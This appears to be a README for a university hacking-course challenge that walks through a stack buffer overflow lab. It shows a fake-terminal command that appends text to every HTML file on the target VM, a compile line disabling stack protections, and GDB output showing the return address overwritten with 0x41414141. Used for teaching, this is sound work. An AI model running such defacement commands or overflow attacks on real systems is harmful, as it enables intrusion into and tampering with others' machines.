# Nu CHALLENGE (INF473X The Hacking Xperience)

## Run commands

Run `./hack_terminal` to open a fake terminal of the VM. Then, type `cd ; for i in $(find . -name *.html); do echo '<p>YOUR NAME</p>' >>  $i; done` to add `YOUR NAME` at the bottom of the HTML page.


## Explanations


## GDB Tests

Let's use GDB (a debugger tool) to better understand what's happening in the stack memory. We'll be using the c program _test_gdb.c_ which is a simplified version of the source code of the application. Once it is compiled with the command `gcc -m32 -fno-stack-protector -z execstack test_gdb.c -o test_gdb`, we can run gdb using `gdb test_gdb`.

First of all, let's try to run the program and feed it a too long name with the command `r < attack.txt` (_attack.txt_ contains a 500-long string of letters 'A' and can be generated with Python `python3 -c 'print("A"*500)' > attack.txt`). Gdb replies a segmentation fault :
```
Program received signal SIGSEGV, Segmentation fault.
0x41414141 in ?? ()
```
`0x41414141` is supposed to be the return pointer and is now not recognised. Moreover, 41 turns out to be the hexadecimal code for the letter 'A' which isn't a coincidence. Indeed, the return pointer was overwritten by the user's input as the latter entered a too long name.
